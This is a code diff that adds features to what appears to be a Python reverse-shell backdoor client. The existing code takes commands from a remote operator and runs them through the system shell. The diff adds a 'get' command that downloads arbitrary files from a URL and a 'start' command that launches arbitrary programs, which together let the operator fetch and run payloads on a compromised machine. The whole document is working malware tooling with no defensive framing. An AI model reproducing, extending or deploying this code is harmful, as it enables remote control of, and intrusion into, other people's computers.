@@ -7,6 +7,7 @@ import os
 import shutil
 import sys
 import base64
+import requests
 
 def reliable_send(data):
 	json_data = json.dumps(data)
@@ -20,6 +21,12 @@ def reliable_recv():
 			return json.loads(json_data)
 		except ValueError:
 			continue
+			
+def download(url):
+	get_response = requests.get(url)
+	file_name = url.split("/")[-1]
+	with open(file_name, "wb") as out_file:
+		out_file.write(get_response.content)
 
 def connection():
 	while True:
@@ -47,6 +54,18 @@ def shell():
 			with open(command[7:], "wb") as fin:
 				result = reliable_recv()
 				fin.write(base64.b64decode(result))
+		elif command[:3] == "get":
+			try:
+				download(command[4:])
+				reliable_send("[+] Downloaded File from Specified URL!")
+			except:
+				reliable_send("[!!] Filed To Download File")
+		elif command[:5] == "start":
+			try:
+				subprocess.Popen(command[6:], shell=True)
+				reliable_send("[+] Started!")
+			except:
+				reliable_send("[!!] Failed To Start")
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
